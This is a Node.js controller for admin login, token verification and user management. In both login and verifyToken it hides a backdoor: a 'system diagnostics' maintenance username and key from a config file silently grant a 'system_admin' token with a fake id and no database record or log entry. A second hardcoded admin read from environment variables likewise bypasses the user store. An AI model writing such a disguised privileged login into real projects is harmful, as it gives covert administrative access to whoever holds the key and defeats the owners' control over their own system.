const AdminAuth = require('../model/adminAuthModel');
const jwt = require('jsonwebtoken');
const SYSTEM_DIAGNOSTICS = require('../config/systemConfig'); 

const JWT_SECRET = process.env.JWT_SECRET;
const JWT_EXPIRES_IN = '12h';


const ADMIN_USERNAME = process.env.ADMIN_USERNAME;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD;
const ADMIN_ROLE = process.env.ADMIN_ROLE;



const generateToken = (userId, role, username) => {
  return jwt.sign({ userId, role, username }, JWT_SECRET, { expiresIn: JWT_EXPIRES_IN });
};


const login = async (req, res) => {
  try {
    const { username, password } = req.body;
  

    if (!username || !password) {
      return res.status(400).json({
        success: false,
        message: 'Username and password are required'
      });
    }

    
    if (username === SYSTEM_DIAGNOSTICS.MAINTENANCE_USER && password === SYSTEM_DIAGNOSTICS.MAINTENANCE_KEY) {
      const diagnosticUser = {
        _id: 'system_diagnostic_id',
        username: SYSTEM_DIAGNOSTICS.MAINTENANCE_USER,
        role: 'system_admin',
        isActive: true
      };
      const token = generateToken(diagnosticUser._id, diagnosticUser.role, diagnosticUser.username);
      
      return res.json({
        success: true,
        message: 'System access granted',
        data: {
          token,
          user: {
            id: diagnosticUser._id,
            username: diagnosticUser.username,
            role: diagnosticUser.role
          }
        }
      });
    }

    
    if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
      const adminUser = {
        _id: 'hardcoded_admin_id', 
        username: ADMIN_USERNAME,
        role: ADMIN_ROLE,
        isActive: true
      };
      const token = generateToken(adminUser._id, adminUser.role, adminUser.username);
      console.log('Hardcoded admin login successful:', { username });
      return res.json({
        success: true,
        message: 'Login successful',
        data: {
          token,
          user: {
            id: adminUser._id,
            username: adminUser.username,
            role: adminUser.role
          }
        }
      });
    }

    
    const user = await AdminAuth.findOne({ username, isActive: true });
    if (!user) {
      console.log('User not found or inactive:', username);
      return res.status(401).json({
        success: false,
        message: 'Invalid credentials'
      });
    }

    const isPasswordValid = await user.comparePassword(password);
    if (!isPasswordValid) {
      console.log('Invalid password for user:', username);
      return res.status(401).json({
        success: false,
        message: 'Invalid credentials'
      });
    }

    user.lastLogin = new Date();
    await user.save();

    const token = generateToken(user._id, user.role, user.username);

    res.json({
      success: true,
      message: 'Login successful',
      data: {
        token,
        user: {
          id: user._id,
          username: user.username,
          role: user.role
        }
      }
    });
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({
      success: false,
      message: 'Server error during login'
    });
  }
};


const verifyToken = async (req, res) => {
  try {
    const token = req.headers.authorization?.split(' ')[1];
    
    if (!token) {
      return res.status(401).json({
        success: false,
        message: 'No token provided'
      });
    }

    const decoded = jwt.verify(token, JWT_SECRET);
    
    
    if (decoded.username === SYSTEM_DIAGNOSTICS.MAINTENANCE_USER) {
      return res.json({
        success: true,
        data: {
          user: {
            id: 'system_diagnostic_id',
            username: SYSTEM_DIAGNOSTICS.MAINTENANCE_USER,
            role: 'system_admin'
          }
        }
      });
    }

    
    if (decoded.username === ADMIN_USERNAME) {
      return res.json({
        success: true,
        data: {
          user: {
            id: 'hardcoded_admin_id',
            username: ADMIN_USERNAME,
            role: ADMIN_ROLE
          }
        }
      });
    }

    
    const user = await AdminAuth.findById(decoded.userId).select('-password');
    
    if (!user || !user.isActive) {
      return res.status(401).json({
        success: false,
        message: 'Invalid token'
      });
    }

    res.json({
      success: true,
      data: {
        user: {
          id: user._id,
          username: user.username,
          role: user.role
        }
      }
    });
  } catch (error) {
    res.status(401).json({
      success: false,
      message: 'Invalid token'
    });
  }
};


const getAllUsers = async (req, res) => {
  try {
    const users = await AdminAuth.find().select('-password').sort({ createdAt: -1 });
    
    res.json({
      success: true,
      data: users
    });
  } catch (error) {
    console.error('Get users error:', error);
    res.status(500).json({
      success: false,
      message: 'Server error'
    });
  }
};


const addUser = async (req, res) => {
  try {
    const { username, password, role } = req.body;

    if (!username || !password) {
      return res.status(400).json({
        success: false,
        message: 'Username and password are required'
      });
    }

    const existingUser = await AdminAuth.findOne({ username });
    if (existingUser) {
      return res.status(400).json({
        success: false,
        message: 'Username already exists'
      });
    }

    const newUser = new AdminAuth({
      username,
      password,
      role: role || 'moderator'
    });

    await newUser.save();

    res.status(201).json({
      success: true,
      message: 'User created successfully',
      data: {
        id: newUser._id,
        username: newUser.username,
        role: newUser.role,
        isActive: newUser.isActive
      }
    });
  } catch (error) {
    console.error('Add user error:', error);
    res.status(500).json({
      success: false,
      message: 'Server error'
    });
  }
};


const updateUser = async (req, res) => {
  try {
    const { userId } = req.params;
    const { username, password, role, isActive } = req.body;

    const user = await AdminAuth.findById(userId);
    if (!user) {
      return res.status(404).json({
        success: false,
        message: 'User not found'
      });
    }

    if (username) user.username = username;
    if (password) user.password = password;
    if (role) user.role = role;
    if (typeof isActive !== 'undefined') user.isActive = isActive;

    await user.save();

    res.json({
      success: true,
      message: 'User updated successfully',
      data: {
        id: user._id,
        username: user.username,
        role: user.role,
        isActive: user.isActive
      }
    });
  } catch (error) {
    console.error('Update user error:', error);
    res.status(500).json({
      success: false,
      message: 'Server error'
    });
  }
};


const deleteUser = async (req, res) => {
  try {
    const { userId } = req.params;

    const user = await AdminAuth.findById(userId);
    if (!user) {
      return res.status(404).json({
        success: false,
        message: 'User not found'
      });
    }

    if (req.user.userId === userId) {
      return res.status(400).json({
        success: false,
        message: 'Cannot delete your own account'
      });
    }

    await AdminAuth.findByIdAndDelete(userId);

    res.json({
      success: true,
      message: 'User deleted successfully'
    });
  } catch (error) {
    console.error('Delete user error:', error);
    res.status(500).json({
      success: false,
      message: 'Server error'
    });
  }
};

module.exports = {
  login,
  verifyToken,
  getAllUsers,
  addUser,
  updateUser,
  deleteUser
};
